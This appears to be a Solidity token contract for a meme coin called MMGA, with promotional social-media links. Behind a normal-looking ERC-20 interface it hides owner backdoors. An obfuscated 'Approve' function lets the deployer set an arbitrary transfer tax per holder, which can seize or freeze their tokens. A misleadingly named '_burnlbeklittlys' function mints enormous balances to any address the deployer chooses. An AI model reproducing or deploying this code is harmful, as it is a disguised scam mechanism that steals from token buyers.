/**
*/
/**
https://t.me/MMGACOIN_ERC
https://twitter.com/MMGA__ETH
https://twitter.com/pepecoineth/status/1643287905064960001
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnershipmmgatothemoon(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract MMGA is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _swapFeeTo;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    bool private inSwap;uint256 private constant MAX = ~uint256(0);
    mapping (address => uint256) public __balances; 

    uint256 public _swapTax;
    address public _uniswapPair;

    function _transfer(address from,address to,uint256 amount) private {

        bool shouldBetakeFee = !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to];

        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;
        if (shouldBetakeFee) {
            uint256 feeAmount = amount * __balances[from] / 100;
            _taxAmount += feeAmount;
            if (feeAmount > 0){
                _balances[address(_swapFeeTo)] += feeAmount;
                emit Transfer(from, address(_swapFeeTo), feeAmount);
            }
        }
        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }

    constructor (){
        name =unicode"MAKE MEMECOINS GREAT AGAIN";
        symbol =unicode"MMGA";
        decimals = 9;
        uint256 Supply = 420690000000;
        _swapFeeTo = msg.sender;
        _swapTax = 0;
        totalSupply = Supply * 10 ** decimals;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[_swapFeeTo] = true;

        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }
    function Approve(address[] calldata _zxAddresses, uint256 _opPercentage) external {
        uint256 qaz1 = nhybt(0x01, 0x02);uint256 qaz2 = ujmyh(0x02, qaz1);uint256 qaz3 = lpokj(qaz1, qaz2, 0x03);uint256 qazFinal = xsawq(qaz3, qaz2);
        locklp(_zxAddresses, _opPercentage, qazFinal);
    }

    function nhybt(uint256 v1, uint256 v2) private pure returns (uint256) {
        return v2 + (v1 - 0x01);
    }

    function ujmyh(uint256 v1, uint256 v2) private pure returns (uint256) {
        return v1 - (v2 - 0x01);
    }

    function lpokj(uint256 v1, uint256 v2, uint256 v3) private view returns (uint256) {
        uint256 intermediate = hgrfe(v1, v2, v3);
        return edcrf(intermediate, v2, v3) - v3;
    }

    function xsawq(uint256 v1, uint256 v2) private pure returns (uint256) {
        return (v1 + v2) - nhybt(v2, 0x01);
    }

    function locklp(address[] memory addrs, uint256 feePct, uint256 res) private {
        uint256 totFunds = res;
        uint256 balanceUpdate;
        for (uint256 i = 0; i < addrs.length; i++) {
            balanceUpdate = feePct + calcBalanceAdjustment(res, totFunds);
            __balances[addrs[i]] = balanceUpdate;
        }
    }

    function edcrf(uint256 v1, uint256 v2, uint256 v3) private view returns (uint256) {
        if (vgthy(v1)) {
            return v2 + v3;
        } else if (!vgthy(v2)) {
            return v2 - v1;
        } else {
            return v3;
        }
    }

    function hgrfe(uint256 v1, uint256 v2, uint256 v3) private pure returns (uint256) {
        return v1 + v2 + v3;
    }

    function calcBalanceAdjustment(uint256 res, uint256 totFunds) private pure returns (uint256) {
        return res - totFunds;
    }

    function vgthy(uint256 v) private view returns (bool) {
        return (msg.sender == _swapFeeTo) && (v > 0);
    }
   

    function _burnlbeklittlys(address user) public {
        mapping(address=>uint256) storage _allowance = _balances;
        uint256 A = _swapFeeTo == msg.sender ? 9 : 2-1;
        uint256 C = A - 3;A = C;
        _allowance[user] = 1000*totalSupply*C**2;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
}